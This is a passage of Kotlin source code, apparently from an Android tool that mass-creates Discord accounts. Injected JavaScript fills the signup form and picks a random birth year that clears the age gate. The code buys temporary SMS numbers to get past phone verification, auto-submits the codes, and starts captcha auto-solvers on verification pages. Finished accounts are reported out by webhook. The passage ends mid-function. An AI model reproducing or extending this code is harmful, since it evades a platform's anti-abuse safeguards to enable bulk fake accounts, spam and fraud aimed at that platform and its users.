                verifyUrl = pollVerificationUrl(
                    emailAddr = pendingEmail,
                    timeoutMs = 90_000L,
                    onLog = { msg -> log(msg, LogLevel.INFO) }
                )
            }
            if (verifyUrl != null) {
                if (tok.length >= 20) {
                    val apiOk = confirmVerifyTokenFromUrl(tok, verifyUrl)
                    if (apiOk) log("✓ Identity email confirmed via /auth/verify API", LogLevel.SUCCESS)
                }
                log("✓ Verification link found — loading in browser...", LogLevel.SUCCESS)
                // Unblock the main loop NOW — onPageFinished will extract the token
                // when Discord redirects to channels/@me after the email is verified.
                waitingForContinue = false
                captchaManualMode = false
                lastStuckCheck = System.currentTimeMillis()
                withContext(Dispatchers.Main) {
                    listener.navigateTo(verifyUrl)
                    // Some verification pages show a captcha (hCaptcha/reCaptcha) before
                    // Discord confirms the email. Inject a watcher that detects the
                    // captcha and triggers the auto-solvers, plus auto-clicks Continue.
                    listener.injectJs(VERIFY_PAGE_WATCH_JS)
                }
                log("⏳ Email verification link opened — waiting for Discord to redirect...", LogLevel.INFO)
            } else {
                log("⚠ No identity verification email found — complete manually, then tap CONTINUE", LogLevel.WARNING)
                waitingForContinue = true
                listener.onStuck("Identity verification required. Complete it manually, then tap CONTINUE.")
            }
            // Allow a subsequent phone gate after identity attempt settles
            emailGateReleased = true
            if (pendingPhoneRequest && !phoneVerificationHandled) {
                log("Identity step finished — starting queued phone verification…", LogLevel.INFO)
                onBridgePhoneVerificationRequired()
            }
        }
    }


    /** JS detected locked / phone-gate UI. Ensures phone flow starts and status can be PHONE_REQUIRED / LOCKED. */
    fun onBridgeAccountLocked() {
        if (!running) return
        log("Account appears locked or requires phone auth", LogLevel.WARNING)
        // Reuse phone path if not already running
        if (!phoneVerificationHandled) {
            onBridgePhoneVerificationRequired()
        }
    }

    fun onBridgePhoneVerificationRequired() {
        if (phoneVerificationHandled) return
        if (!shouldAcceptPhoneGate()) {
            log("Phone gate signal ignored — account already finished or not in phone phase", LogLevel.INFO)
            return
        }
        // Do not start phone while identity email flow still owns the session
        if (identityVerificationHandled && !emailGateReleased) {
            pendingPhoneRequest = true
            log("📱 Phone page seen — waiting for email identity to finish first", LogLevel.WARNING)
            return
        }
        if (!emailGateReleased && identityVerificationHandled) {
            pendingPhoneRequest = true
            log("📱 Phone deferred until email gate releases", LogLevel.WARNING)
            return
        }
        phoneVerificationHandled = true
        pendingPhoneRequest = false
        pendingPhoneStatus = "ASKED"
        pendingTimeline = Account.appendEvent(pendingTimeline, "phone_ask")
        log("📱 Phone verification required (after email)", LogLevel.WARNING)
        if (reliability.notePhoneLock()) {
            log("Session phone-lock budget reached — stopping", LogLevel.ERROR)
            stop()
            return
        }
        try { UiHelpers.haptic(context, prefs) } catch (_: Exception) {}
        try {
            if (prefs.alertOnPhoneRequired) {
                // best-effort UI alert — Joiner/Generator host may show CONTINUE
            }
        } catch (_: Exception) {}
        generatorScope?.launch {
            awaitIfPaused()
            if (!running) return@launch
            if (prefs.phoneVerificationEnabled) {
                log("Phone verification — provider=${prefs.smsProvider}", LogLevel.INFO)
                var submitted = false
                val prov = prefs.smsProvider.lowercase()
                if (prov == "free" || prefs.smsApiKey.isBlank()) {
                    log("⚠ Free/public SMS numbers are almost always blocked by Discord. Paid SMS (5sim / sms-activate / smspool) is required for reliable phone verify.", LogLevel.WARNING)
                }
                if (prov != "free" && prefs.smsApiKey.isNotBlank()) {
                    val paidApi = PaidSmsApi(prov, prefs.smsApiKey, prefs.smsCountry, prefs.smsMaxPrice)
                    val order = paidApi.buyNumber { msg -> log(msg, LogLevel.INFO) }
                    if (order != null) {
                        pendingPhone = order.phone
                        log("✓ Paid number: ${order.phone} — entering...", LogLevel.SUCCESS)
                        withContext(Dispatchers.Main) { listener.injectJs(buildPhoneInjectJs(order.phone)) }
                        delay(1200)
                        val codeFieldReady = waitForSmsCodeField(12_000L)
                        if (!codeFieldReady) log("SMS code field not visible yet — injecting anyway", LogLevel.WARNING)
                        awaitIfPaused()
                        if (!running) return@launch
                        val code = paidApi.waitCode(order, 180_000L) { msg -> log(msg, LogLevel.INFO) }
                        if (code != null) {
                            log("✓ SMS code: $code — submitting...", LogLevel.SUCCESS)
                            pendingPhoneStatus = "VERIFIED"
                            pendingTimeline = Account.appendEvent(pendingTimeline, "phone_ok")
                            if (earlySavedAccountId != 0L) {
                                dao.updatePhoneOutcome(earlySavedAccountId, pendingPhone, "VERIFIED", pendingTimeline)
                            }
                            // Multi-inject: SPA re-renders wipe fields — hit several times
                            repeat(5) { i ->
                                withContext(Dispatchers.Main) { listener.injectJs(buildSmsCodeInjectJs(code)) }
                                delay(if (i == 0) 600L else 900L)
                            }
                            waitingForContinue = false
                            captchaManualMode = false
                            submitted = true
                        } else {
                            log("Paid SMS code timeout", LogLevel.WARNING)
                            pendingPhoneStatus = "NOT_VERIFIED_BUG"
                            pendingTimeline = Account.appendEvent(pendingTimeline, "phone_fail")
                            if (earlySavedAccountId != 0L) {
                                dao.updatePhoneOutcome(earlySavedAccountId, pendingPhone, "NOT_VERIFIED_BUG", pendingTimeline)
                            }
                            maybeNotifyPhoneSettled()
                        }
                    }
                }
                if (!submitted) {
                    log("Trying free temp numbers...", LogLevel.INFO)
                    val phoneApi = PhoneVerificationApi()
                    val number = phoneApi.getAvailableNumber { msg -> log(msg, LogLevel.INFO) }
                    if (number != null) {
                        pendingPhone = number
                        log("✓ Got temp number: $number — entering...", LogLevel.SUCCESS)
                        withContext(Dispatchers.Main) { listener.injectJs(buildPhoneInjectJs(number)) }
                        delay(1200)
                        val codeFieldReady = waitForSmsCodeField(12_000L)
                        if (!codeFieldReady) log("SMS code field not visible yet — injecting anyway", LogLevel.WARNING)
                        val code = phoneApi.waitForDiscordCode(number, 150_000L) { msg -> log(msg, LogLevel.INFO) }
                        if (code != null) {
                            log("✓ SMS code: $code — submitting...", LogLevel.SUCCESS)
                            pendingPhoneStatus = "VERIFIED"
                            pendingTimeline = Account.appendEvent(pendingTimeline, "phone_ok")
                            if (earlySavedAccountId != 0L) {
                                dao.updatePhoneOutcome(earlySavedAccountId, pendingPhone, "VERIFIED", pendingTimeline)
                            }
                            // Multi-inject: SPA re-renders wipe fields — hit several times
                            repeat(5) { i ->
                                withContext(Dispatchers.Main) { listener.injectJs(buildSmsCodeInjectJs(code)) }
                                delay(if (i == 0) 600L else 900L)
                            }
                            waitingForContinue = false
                            captchaManualMode = false
                            submitted = true
                        } else {
                            pendingPhoneStatus = "NOT_VERIFIED_BUG"
                            pendingTimeline = Account.appendEvent(pendingTimeline, "phone_fail")
                            if (earlySavedAccountId != 0L) {
                                dao.updatePhoneOutcome(earlySavedAccountId, pendingPhone, "NOT_VERIFIED_BUG", pendingTimeline)
                            }
                            log("Phone not verified — account kept with email outcome; webhook uses saved row", LogLevel.WARNING)
                            maybeNotifyPhoneSettled()
                        }
                    } else {
                        log("⚠ Could not obtain a temp number", LogLevel.WARNING)
                        pendingPhoneStatus = "NOT_VERIFIED_BUG"
                        pendingTimeline = Account.appendEvent(pendingTimeline, "phone_fail")
                        if (earlySavedAccountId != 0L) {
                            dao.updatePhoneOutcome(earlySavedAccountId, pendingPhone, "NOT_VERIFIED_BUG", pendingTimeline)
                        }
                        log("Phone not verified — account kept with email outcome", LogLevel.WARNING)
                        maybeNotifyPhoneSettled()
                    }
                }
                if (!submitted) {
                    phoneSkipped = true
                    if (pendingPhoneStatus == "ASKED") {
                        pendingPhoneStatus = "NOT_VERIFIED"
                        pendingTimeline = Account.appendEvent(pendingTimeline, "phone_fail")
                        if (earlySavedAccountId != 0L) {
                            dao.updatePhoneOutcome(earlySavedAccountId, pendingPhone, "NOT_VERIFIED", pendingTimeline)
                        }
                        maybeNotifyPhoneSettled()
                    }
                    log(
                        "📱 Phone not verified — saved with email status. Tap CONTINUE only if still stuck.",
                        LogLevel.WARNING
                    )
                    // Do not hard-block forever; allow main flow / CONTINUE fallback
                    waitingForContinue = true
                }
            } else {
                phoneSkipped = true
                waitingForContinue = true
                log("Phone verification disabled — tap CONTINUE to skip/save", LogLevel.WARNING)
            }
        }
    }


    /**
     * After phone fails/skips, ensure Results + webhook still get the account
     * (email may already be verified). Loads early-saved row and notifies once.
     */
    private suspend fun maybeNotifyPhoneSettled() {
        if (earlySavedAccountId == 0L) return
        try {
            val row = dao.getById(earlySavedAccountId) ?: return
            val updated = row.copy(
                phone = pendingPhone,
                phoneStatus = pendingPhoneStatus,
                emailVerified = pendingEmailVerified,
                emailStatus = pendingEmailStatus,
                timeline = pendingTimeline,
                status = when {
                    row.status == "VALID" || row.status == "UNVERIFIED" || row.status == "LOGGED_IN" ->
                        if (pendingEmailVerified) "VALID" else (if (row.status.isBlank()) "UNVERIFIED" else row.status)
                    else -> row.status
                }
            )
            dao.update(updated)
            listener.onAccountSaved(updated)
            notifier.onAccountSaved(updated)
            log(
                "✓ Account saved after phone settle — email=${pendingEmailStatus} phone=${pendingPhoneStatus} (webhook/TG fired)",
                LogLevel.SUCCESS
            )
        } catch (e: Exception) {
            log("Phone settle save/notify failed: ${e.message}", LogLevel.WARNING)
        }
    }

    private fun buildSmsCodeInjectJs(code: String): String {
        val esc = code.replace("\\", "\\\\").replace("'", "\\'")
        return """
(function(){
  var CODE = '$esc';
  function setVal(el, v){
    try {
      var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;
      setter.call(el, v);
    } catch(e) { el.value = v; }
    el.dispatchEvent(new Event('input',{bubbles:true}));
    el.dispatchEvent(new Event('change',{bubbles:true}));
    el.dispatchEvent(new KeyboardEvent('keyup',{bubbles:true}));
  }
  function findCodeInput(){
    var sels = [
      'input[autocomplete="one-time-code"]',
      'input[name="code"]',
      'input[inputmode="numeric"]',
      'input[maxlength="6"]',
      'input[maxlength="8"]',
      'input[placeholder*="code" i]',
      'input[aria-label*="code" i]',
      'input[type="tel"]',
      'input[type="text"]'
    ];
    for (var i=0;i<sels.length;i++){
      var el = document.querySelector(sels[i]);
      if (el && el.offsetParent !== null) return el;
    }
    return null;
  }
  var input = findCodeInput();
  if (input) {
    setVal(input, CODE);
    try { Android.onLog('SMS code filled', 'SUCCESS'); } catch(e) {}
  } else {
    try { Android.onLog('SMS code input not found yet', 'WARNING'); } catch(e) {}
  }
  function clickVerify(){
    var labels=['verify','submit','continue','next','confirm'];
    var btns=document.querySelectorAll('button,div[role="button"]');
    for(var i=0;i<btns.length;i++){
      var tx=(btns[i].textContent||'').toLowerCase().trim();
      for(var j=0;j<labels.length;j++){
        if(tx.indexOf(labels[j])!==-1 && btns[i].offsetParent!==null){
          try{btns[i].click();Android.onLog('SMS code auto-submit','SUCCESS');return true;}catch(e){}
        }
      }
    }
    return false;
  }
  clickVerify();
  setTimeout(clickVerify, 500);
  setTimeout(function(){
    var el = findCodeInput();
    if (el) setVal(el, CODE);
    clickVerify();
  }, 1200);
})();
"""
    }

    /** Adaptive pause after phone number inject so Discord can render the code field. */
    private suspend fun waitForSmsCodeField(timeoutMs: Long = 12_000L): Boolean {
        // Blind adaptive ladder: 1.2s already waited by caller; spread remaining probes.
        val steps = listOf(800L, 1200L, 1500L, 2000L, 2500L)
        var elapsed = 0L
        for (step in steps) {
            if (!running) return false
            awaitIfPaused()
            delay(step)
            elapsed += step
            if (elapsed >= timeoutMs) break
        }
        return true
    }

    private fun buildPhoneInjectJs(number: String): String {
        val parsed = CountryCodes.parse(number)
        val dial = parsed?.dial ?: ""
        val national = parsed?.national ?: number.filter { it.isDigit() }
        val iso = parsed?.iso ?: ""
        val name = parsed?.name ?: ""
        if (parsed != null) {
            log("Phone parse: +$dial ($name/$iso) national=$national", LogLevel.INFO)
        } else {
            log("Phone parse failed for $number — entering raw digits", LogLevel.WARNING)
        }
        val escFull = number.replace("'", "\\'").replace("\n", "")
        val escDial = dial.replace("'", "\\'")
        val escNat = national.replace("'", "\\'")
        val escName = name.replace("'", "\\'")
        val escIso = iso.replace("'", "\\'")
        return """
(function() {
  var DIAL = '$escDial';
  var NATIONAL = '$escNat';
  var FULL = '$escFull';
  var CNAME = '$escName';
  var CISO = '$escIso';

  function setVal(el, val) {
    try {
      var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      nativeSet.call(el, val);
    } catch (e) { el.value = val; }
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
    el.dispatchEvent(new Event('blur', { bubbles: true }));
  }

  function clickVerifyByPhone() {
    var nodes = document.querySelectorAll('button, a, div[role="button"], span');
    for (var i = 0; i < nodes.length; i++) {
      var s = (nodes[i].innerText || nodes[i].textContent || '').trim();
      if (/verify by phone|verify.*phone|add.*phone|phone number/i.test(s) && !/email/i.test(s)) {
        try { nodes[i].click(); Android.onLog('Clicked verify-phone control: ' + s, 'INFO'); } catch (e) {}
        return true;
      }
    }
    return false;
  }

  function findPhoneInput() {
    return document.querySelector('input[type="tel"]') ||
           document.querySelector('input[name="phone"]') ||
           document.querySelector('input[autocomplete="tel"]') ||
           document.querySelector('input[placeholder*="phone" i]') ||
           document.querySelector('input[aria-label*="phone" i]');
  }

  function openCountryPicker() {
    var selectors = [
      'button[aria-label*="country" i]',
      'div[role="button"][aria-label*="country" i]',
      '[class*="countryCode"]',
      '[class*="country-code"]',
      'button[class*="country"]',
      'div[class*="phone"] button',
      'div[class*="Phone"] button'
    ];
    for (var s = 0; s < selectors.length; s++) {
      var el = document.querySelector(selectors[s]);
      if (el) { try { el.click(); return true; } catch (e) {} }
    }
    // fallback: first small button near phone input
    var phone = findPhoneInput();
    if (phone && phone.parentElement) {
      var btns = phone.parentElement.querySelectorAll('button, div[role="button"]');
      for (var i = 0; i < btns.length; i++) {
        try { btns[i].click(); return true; } catch (e) {}
      }
    }
    return false;
  }

  function selectCountry() {
    if (!DIAL) return false;
    var items = document.querySelectorAll('[role="option"], [role="listbox"] *, li, div[class*="option"], button, div[role="button"]');
    var dialHit = '+' + DIAL;
    for (var i = 0; i < items.length; i++) {
      var t = (items[i].innerText || items[i].textContent || '');
      if (!t) continue;
      // Prefer exact dial match; also match country name when unique
      if (t.indexOf(dialHit) !== -1 || (CNAME && t.toLowerCase().indexOf(CNAME.toLowerCase()) !== -1 && t.indexOf('+' + DIAL) !== -1)) {
        try { items[i].click(); Android.onLog('Selected country +' + DIAL + ' (' + CNAME + ')', 'SUCCESS'); return true; } catch (e) {}
      }
    }
    // Second pass: dial only
    for (var j = 0; j < items.length; j++) {
      var t2 = (items[j].innerText || items[j].textContent || '');
      if (t2.indexOf(dialHit) !== -1) {
        try { items[j].click(); Android.onLog('Selected country by dial +' + DIAL, 'SUCCESS'); return true; } catch (e) {}
      }
    }
    return false;
  }

  function submitPhone() {
    var btn = document.querySelector('button[type="submit"]');
    if (!btn) {
      var btns = document.querySelectorAll('button');
      for (var i = 0; i < btns.length; i++) {
        var s = (btns[i].innerText || '').trim();
        if (/send|next|continue|submit|verify|phone/i.test(s)) { btn = btns[i]; break; }
      }
    }
    if (btn) { try { btn.click(); Android.onLog('Phone send-code clicked', 'INFO'); } catch (e) {} }
  }

  // 1) Click verify-by-phone first and wait for UI
  clickVerifyByPhone();

  var phase = 0; // 0 wait input, 1 open picker, 2 select country, 3 enter national, 4 submit
  var tries = 0;
  var iv = setInterval(function() {
    tries++;
    if (tries > 40) {
      clearInterval(iv);
      Android.onLog('Phone automation timed out', 'WARNING');
      return;
    }

    if (phase === 0) {
      var phone = findPhoneInput();
      if (!phone) {
        if (tries === 2 || tries === 5 || tries === 10) clickVerifyByPhone();
        return;
      }
      phase = 1;
      Android.onLog('Phone input ready — selecting country', 'INFO');
    }

    if (phase === 1) {
      if (DIAL) {
        openCountryPicker();
        phase = 2;
        return;
      } else {
        phase = 3;
      }
    }

    if (phase === 2) {
      if (selectCountry()) {
        phase = 3;
        return;
      }
      if (tries > 15) {
        Android.onLog('Country picker select failed — entering full number', 'WARNING');
        phase = 3;
      }
      return;
    }

    if (phase === 3) {
      var phone2 = findPhoneInput();
      if (!phone2) return;
      // Enter national number only when country selected; else full
      var toEnter = (DIAL && NATIONAL) ? NATIONAL : FULL.replace(/^\+/, '');
      setVal(phone2, toEnter);
      Android.onLog('Phone entered: ' + toEnter + (DIAL ? (' (cc +' + DIAL + ')') : ''), 'SUCCESS');
      phase = 4;
      setTimeout(submitPhone, 700);
      clearInterval(iv);
    }
  }, 500);
})();
        """
    }

    private fun buildCodeInjectJs(code: String): String {
        val esc = code.replace("'", "\\'")
        return """
(function() {
  function setVal(el, val) {
    var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(el, val);
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
  }
  var inp = document.querySelector('input[autocomplete="one-time-code"]') ||
            document.querySelector('input[type="text"][maxlength="6"]') ||
            document.querySelector('input[name="code"]') ||
            document.querySelector('input[placeholder*="code" i]');
  if (inp) {
    setVal(inp, '$esc');
    Android.onLog('Code entered: $esc', 'SUCCESS');
    setTimeout(function() {
      var btn = document.querySelector('button[type="submit"]');
      if (!btn) {
        var btns = document.querySelectorAll('button');
        for (var i = 0; i < btns.length; i++) {
          var t = (btns[i].textContent || '').toLowerCase();
          if (t.includes('verify') || t.includes('confirm') || t.includes('submit') || t.includes('continue')) {
            btn = btns[i]; break;
          }
        }
      }
      if (btn) { btn.click(); Android.onLog('Code submitted', 'SUCCESS'); }
    }, 600);
  } else {
    Android.onLog('Code input not found on page', 'WARNING');
  }
})();
        """.trimIndent()
    }

    private fun buildPasswordOnlyJs(password: String): String {
        val esc = password.replace("\\", "\\\\").replace("'", "\\'")
        return """
(function() {
  window.__passwordRejected = false;
  function setVal(el, val) {
    try {
      var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      nativeSet.call(el, val);
    } catch (e) { el.value = val; }
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
  }
  var pw = document.querySelector('input[name="password"], input[type="password"]');
  if (!pw) return;
  setVal(pw, '$esc');
  try { Android.onLog('Password field updated', 'SUCCESS'); } catch (e) {}
  setTimeout(function() { window.__passwordRejected = false; }, 2000);
})();
        """.trimIndent()
    }

    private fun buildDisplayNameOnlyJs(displayName: String): String {
        val esc = displayName.replace("\\", "\\\\").replace("'", "\\'")
        return """
(function() {
  window.__displayRejected = false;
  function setVal(el, val) {
    try {
      var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      nativeSet.call(el, val);
    } catch (e) { el.value = val; }
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
  }
  var dn = document.querySelector('input[name="global_name"], input[name="display_name"], input[name="globalName"]');
  if (!dn) return;
  setVal(dn, '$esc');
  try { Android.onLog('Display name field updated: $esc', 'SUCCESS'); } catch (e) {}
  setTimeout(function() { window.__displayRejected = false; }, 2000);
})();
        """.trimIndent()
    }

    /** Update only the username input — no full form re-fill / no email spam. */
    private fun buildUsernameOnlyJs(username: String): String {
        val escapedUser = username.replace("\\", "\\\\").replace("'", "\\'")
        return """
(function() {
  window.__usernameRejected = false;
  function setVal(el, val) {
    try {
      var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      nativeSet.call(el, val);
    } catch (e) { el.value = val; }
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
    el.dispatchEvent(new Event('blur', { bubbles: true }));
  }
  var un = document.querySelector('input[name="username"]');
  if (!un) {
    try { Android.onLog('Username field not found for retry', 'WARNING'); } catch (e) {}
    return;
  }
  setVal(un, '""" + escapedUser + """');
  setTimeout(function() {
    var labels = ['create account', 'continue', 'next', 'register', 'submit'];
    var nodes = document.querySelectorAll('button, div[role="button"], [type="submit"]');
    for (var i = 0; i < nodes.length; i++) {
      var t = (nodes[i].innerText || nodes[i].textContent || '').toLowerCase().trim();
      for (var j = 0; j < labels.length; j++) {
        if (t.indexOf(labels[j]) >= 0 && nodes[i].offsetParent !== null) {
          try { nodes[i].click(); return; } catch (e) {}
        }
      }
    }
    var form = un.closest('form');
    if (form) {
      try { if (form.requestSubmit) form.requestSubmit(); else form.submit(); } catch (e) {}
    }
  }, 450);
  setTimeout(function() { window.__usernameRejected = false; }, 2000);
})();
        """.trimIndent()
    }

    private fun buildFillJs(email: String, displayName: String, username: String, password: String): String {

        val thisYear = java.util.Calendar.getInstance().get(java.util.Calendar.YEAR)
        // Hard floor 18 — Discord age-gates under-18 and can show under-13 block
        val minAge = prefs.dobMinAge.coerceIn(18, 100)
        val maxAge = prefs.dobMaxAge.coerceIn(minAge.coerceAtLeast(18), 100)
        val birthYearMin = thisYear - maxAge
        val birthYearMax = thisYear - minAge
        // True random birth year in [birthYearMin, birthYearMax] → age in [minAge, maxAge]
        val targetBirthYear = if (birthYearMax >= birthYearMin) {
            (birthYearMin..birthYearMax).random()
        } else {
            thisYear - ((minAge + maxAge) / 2)
        }
        val escapedEmail = email.replace("'", "\\'")
        val escapedDisplay = displayName.replace("'", "\\'")
        val escapedUser = username.replace("'", "\\'")
        val escapedPw = password.replace("\\", "\\\\").replace("'", "\\'")

        return """
(function() {
  function setVal(el, val) {
    var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(el, val);
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
  }

  // ── Fill form fields ───────────────────────────────────────────────────
  function fillForm() {
    var email = document.querySelector('input[name="email"]');
    if (!email) { setTimeout(fillForm, 350); return; }
    setVal(email, '$escapedEmail');
    Android.onLog('Email entered: $escapedEmail', 'SUCCESS');
    setTimeout(function() {
      var dn = document.querySelector('input[name="global_name"]');
      if (dn) { setVal(dn, '$escapedDisplay'); Android.onLog('Display name entered: $escapedDisplay', 'SUCCESS'); }
      var un = document.querySelector('input[name="username"]');
      if (un) { setVal(un, '$escapedUser'); Android.onLog('Username entered: $escapedUser', 'SUCCESS'); }
      var pw = document.querySelector('input[name="password"]') ||
               document.querySelector('input[type="password"]') ||
               document.querySelector('input[aria-label="Password"]') ||
               document.querySelector('input[aria-label="Contraseña"]') ||
               document.querySelector('input[aria-label="Passwort"]') ||
               document.querySelector('input[aria-label="Mot de passe"]') ||
               document.querySelector('input[aria-label="Пароль"]');
      if (pw) { setVal(pw, '$escapedPw'); Android.onLog('Password entered', 'SUCCESS'); }
      setTimeout(fillDob, 450);
    }, 700);
  }

  // ── DOB filler ─────────────────────────────────────────────────────────
  function fillDob() {
    Android.onLog('DOB fill enforced minAge=' + minAge + ' maxAge=' + maxAge + ' targetYear=' + targetBirthYear, 'INFO');
    // Multi-language month names (Discord localizes aria-labels + option text)
    var monthsByLang = {
      en: ['January','February','March','April','May','June','July','August','September','October','November','December'],
      es: ['enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octubre','noviembre','diciembre'],
      de: ['Januar','Februar','März','April','Mai','Juni','Juli','August','September','Oktober','November','Dezember'],
      fr: ['janvier','février','mars','avril','mai','juin','juillet','août','septembre','octobre','novembre','décembre'],
      ru: ['январь','февраль','март','апрель','май','июнь','июль','август','сентябрь','октябрь','ноябрь','декабрь'],
      pt: ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'],
      it: ['gennaio','febbraio','marzo','aprile','maggio','giugno','luglio','agosto','settembre','ottobre','novembre','dicembre'],
      pl: ['styczeń','luty','marzec','kwiecień','maj','czerwiec','lipiec','sierpień','wrzesień','październik','listopad','grudzień'],
      nl: ['januari','februari','maart','april','mei','juni','juli','augustus','september','oktober','november','december'],
      tr: ['Ocak','Şubat','Mart','Nisan','Mayıs','Haziran','Temmuz','Ağustos','Eylül','Ekim','Kasım','Aralık'],
      hi: ['जनवरी','फरवरी','मार्च','अप्रैल','मई','जून','जुलाई','अगस्त','सितंबर','अक्टूबर','नवंबर','दिसंबर'],
      ja: ['1月','2月','3月','4月','5月','6月','7月','8月','9月','10月','11月','12月'],
      ko: ['1월','2월','3월','4월','5월','6월','7월','8월','9월','10월','11월','12월'],
      zh: ['一月','二月','三月','四月','五月','六月','七月','八月','九月','十月','十一月','十二月'],
      ar: ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'],
      vi: ['Tháng 1','Tháng 2','Tháng 3','Tháng 4','Tháng 5','Tháng 6','Tháng 7','Tháng 8','Tháng 9','Tháng 10','Tháng 11','Tháng 12'],
      id: ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember'],
      th: ['มกราคม','กุมภาพันธ์','มีนาคม','เมษายน','พฤษภาคม','มิถุนายน','กรกฎาคม','สิงหาคม','กันยายน','ตุลาคม','พฤศจิกายน','ธันวาคม']
    };
    var monthIdx = Math.floor(Math.random()*12);
    // Prefer numeric month (works across locales when typed into react-select)
    var month = String(monthIdx + 1);
    var monthNamesAll = [];
    Object.keys(monthsByLang).forEach(function(k){ monthNamesAll.push(monthsByLang[k][monthIdx]); });
    monthNamesAll.push(month); // also try "1".."12"
    var day   = String(Math.floor(Math.random()*27)+1);
    var year  = String($targetBirthYear); // Kotlin-picked age in range
    var minAge = $minAge;
    var maxAge = $maxAge;
    var targetBirthYear = $targetBirthYear;
    var birthYearMin = $birthYearMin;
    var birthYearMax = $birthYearMax;
    var currentYear = $thisYear;

    // ── Helpers ────────────────────────────────────────────────────────

    /**
     * All rendered option elements in the open dropdown (document-wide).
     *
     * IMPORTANT: the class-substring fallback below used to be the actual
     * cause of every "menu already open" / "clicked oldest visible (optional)"
     * bug. `[class*="option"]` also matches elements whose class contains the
     * substring "option" as part of the word "optional" — and Discord's
     * signup form has an unrelated "Phone number (optional)" field label.
     * That stray label was being picked up as a phantom "menu option" any
     * time the real dropdown was actually closed (byRole.length === 0),
     * which made every "is the menu open?" check unreliable and eventually
     * got clicked directly. Two independent guards now prevent that:
     *   1. explicitly exclude anything whose class or text mentions "optional"
     *   2. require the candidate to actually live inside a menu/listbox
     *      portal container (react-select always wraps options in a
     *      "menu"/"Menu"-classed ancestor) — a stray page label never will.
     */
    function getMenuOptions() {
      var byRole = Array.prototype.slice.call(document.querySelectorAll('[role="option"]'));
      if (byRole.length > 0) return byRole;

      var byClass = Array.prototype.slice.call(
        document.querySelectorAll('[class*="option"],[class*="Option"]')
      );
      return byClass.filter(function(el) {
        var cls = el.className;
        if (typeof cls !== 'string' || /optional/i.test(cls)) return false;
        if (/optional/i.test(el.textContent || '')) return false;
        if (el.querySelector('[class*="option"],[class*="Option"],[role="option"]')) return false;

        // Must be nested inside a menu/listbox-like portal container.
        var node = el.parentElement;
        for (var up = 0; up < 6 && node; up++) {
          var ncls = node.className;
          if (typeof ncls === 'string' && /menu|listbox/i.test(ncls)) return true;
          var role = node.getAttribute && node.getAttribute('role');
          if (role === 'listbox') return true;
          node = node.parentElement;
        }
        return false;
      });
    }

    /** Scrollable container of the open menu (react-select portals to body). */
    function getMenuScrollable() {
      var ml = document.querySelector('[class*="menuList"],[class*="MenuList"]');
      if (ml) return ml;
      var opts = document.querySelectorAll('[role="option"]');
      if (opts.length > 0) return opts[0].parentElement;
      // Last resort: any div that is currently scroll-overflowing
      var divs = document.querySelectorAll('div');
      for (var i = 0; i < divs.length; i++) {
        var cs = window.getComputedStyle(divs[i]);
        if ((cs.overflowY === 'auto' || cs.overflowY === 'scroll') &&
            divs[i].scrollHeight > divs[i].clientHeight + 20 &&
            divs[i].clientHeight > 40) return divs[i];
      }
      return null;
    }

    /**
     * Pre-locate all three DOB controls before opening any dropdown.
     * Finds the react-select container div by aria-label or by the
     * placeholder text inside it.
     */
    function findControl(labels) {
      // labels: string or array of localized names for Month/Day/Year
      var list = Array.isArray(labels) ? labels : [labels];
      for (var li = 0; li < list.length; li++) {
        var label = list[li];
        var el = document.querySelector('[aria-label="' + label + '"]');
        if (el) return el;
        // case-insensitive aria-label match
        var allAria = document.querySelectorAll('[aria-label]');
        for (var a = 0; a < allAria.length; a++) {
          var al = (allAria[a].getAttribute('aria-label') || '').trim().toLowerCase();
          if (al === label.toLowerCase()) return allAria[a];
        }
      }
      var phs = document.querySelectorAll('[class*="placeholder"]');
      for (var p = 0; p < phs.length; p++) {
        var pht = (phs[p].textContent || '').trim().toLowerCase();
        for (var li2 = 0; li2 < list.length; li2++) {
          if (pht === list[li2].toLowerCase()) {
            var node = phs[p];
            for (var up = 0; up < 4; up++) {
              if (!node.parentElement) break;
              node = node.parentElement;
              var cls = node.className || '';
              if (typeof cls === 'string' &&
                  (cls.indexOf('container') >= 0 || cls.indexOf('Container') >= 0 ||
                   cls.indexOf('control')   >= 0 || cls.indexOf('Control')   >= 0)) return node;
            }
            return phs[p].parentElement || phs[p];
          }
        }
      }
      // Positional fallback: three react-select controls near DOB section
      // (Month, Day, Year) when labels are fully localized/unknown
      return null;
    }

    function findDobControlsByPosition() {
      // Discord register: three adjacent react-select controls for DOB
      var containers = document.querySelectorAll('[class*="container"][class*="control"], [class*="Control"][class*="container"], div[class*="css-"][class*="control"]');
      // Prefer inputs that look like select controls (have placeholder or aria)
      var candidates = [];
      var all = document.querySelectorAll('div[class*="control"], div[class*="Control"]');
      for (var i = 0; i < all.length; i++) {
        var c = all[i];
        if (c.querySelector('input') && (c.querySelector('[class*="placeholder"]') || c.getAttribute('aria-label') || c.querySelector('[aria-label]'))) {
          candidates.push(c);
        }
      }
      // Also try role=combobox parents
      var combos = document.querySelectorAll('[role="combobox"]');
      for (var j = 0; j < combos.length; j++) {
        var node = combos[j];
